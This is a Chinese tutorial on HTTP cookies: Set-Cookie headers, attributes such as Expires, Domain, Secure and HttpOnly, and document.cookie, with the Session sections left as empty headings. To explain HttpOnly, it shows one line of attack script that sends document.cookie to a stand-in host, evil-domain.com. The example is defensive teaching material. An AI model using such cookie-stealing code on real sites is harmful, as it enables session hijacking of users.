# 会话保持

## 学习目标
- 理解会话保持概念
- 理解 Cookie 的使用
- 理解 Session 的使用
## 概述
Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过 4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。

Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。
- 对话（session）管理：保存登录、购物车等需要记录的信息。
- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
- 追踪：记录和分析用户行为。

有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。

Cookie 包含以下几方面的信息。
- Cookie 的名字
- Cookie 的值（真正的数据写在这里面）
- 到期时间
- 所属域名（默认是当前域名）
- 生效的路径（默认是当前网址）

举例来说，用户访问网址www.example.com，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含www.example.com这个域名，以及根路径/。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为/forums，那么这个 Cookie 只有在访问www.example.com/forums及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。

浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。window.navigator.cookieEnabled属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。
```js
// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
```
document.cookie属性返回当前网页的 Cookie。
```js
// 当前网页的 Cookie
document.cookie
```

不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过 30 个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。

浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，http://example.com设置的 Cookie，可以被https://example.com读取。

## Cookie 与 HTTP 协议
Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。
#### HTTP 回应：Cookie 的生成
服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个Set-Cookie字段。
```
Set-Cookie:foo=bar
```
上面代码会在浏览器保存一个名为foo的 Cookie，它的值为bar。
HTTP 回应可以包含多个Set-Cookie字段，即在浏览器生成多个 Cookie。下面是一个例子。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

除了 Cookie 的值，Set-Cookie字段还可以附加 Cookie 的属性。

```
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

上面的几个属性的含义，将在后文解释。
一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。

```
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```

下面是一个例子。
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。

```
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。

```
Set-Cookie: key1=value2; domain=example.com; path=/blog
```


只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。

```
Set-Cookie: key1=value2; domain=example.com; path=/
```
上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。
上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。
#### HTTP 请求：Cookie 的发送
浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的Cookie字段。

```
Cookie: key1=value1; key1=value2
```

上面代码会向服务器发送名为foo的 Cookie，值为bar。
Cookie字段可以包含多个 Cookie，使用分号（;）分隔。

```
Cookie: foo=bar
```

下面是一个例子。
```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```
服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
- Cookie 的各种属性，比如何时过期。
- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
## Cookie 的属性
#### Expires，Max-Age
Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

如果不设置该属性，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。

Max-Age属性指定从现在开始 Cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。

如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。

如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
#### Domain，Path
Domain属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，example.com不设置 Cookie 的domain属性，那么sub.example.com将不会附带这个 Cookie。如果指定了domain属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。

Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致。
#### Secure，HttpOnly
Secure属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的Secure属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。

HttpOnly属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是document.cookie属性、XMLHttpRequest对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的HttpOnly属性，上面代码就不会读到该 Cookie。
## 在浏览器中操作 Cookie
#### document.cookie
document.cookie属性用于读写当前网页的 Cookie。
读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有HTTPOnly属性。

上面代码从document.cookie一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
document.cookie属性是可写的，可以通过它为当前网站添加 Cookie。

```js
document.cookie = 'fontSize=14';
```

写入的时候，Cookie 的值必须写成key=value的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用encodeURIComponent方法达到。

但是，document.cookie一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。

```js
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。
写入 Cookie 的时候，可以一起写入 Cookie 的属性。

```js
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
```

上面代码中，写入 Cookie 的时候，同时设置了expires属性。属性值的等号两边，也是不能有空格的。

各个属性的写入注意点如下。
- path属性必须为绝对路径，默认为当前路径。
- domain属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是example.com，就不能将其设为foo.com。该属性默认为当前的一级域名（不含二级域名）。
- max-age属性的值为秒数。
- expires属性的值为 UTC 格式，可以使用Date.prototype.toUTCString()进行日期格式转换。

document.cookie写入 Cookie 的例子如下。
```js
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
```
Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
删除一个现存 Cookie 的唯一方法，是设置它的expires属性为一个过去的日期。

```js
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
```

上面代码中，名为fontSize的 Cookie 的值为空，过期时间设为 1970 年 1 月 1 月零点，就等同于删除了这个 Cookie。
#### js-cookie
https://github.com/js-cookie/js-cookie
## 在 Node 中操作 Cookie
## Session
## Cookie 和 Session 的区别
## 参考资料
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies

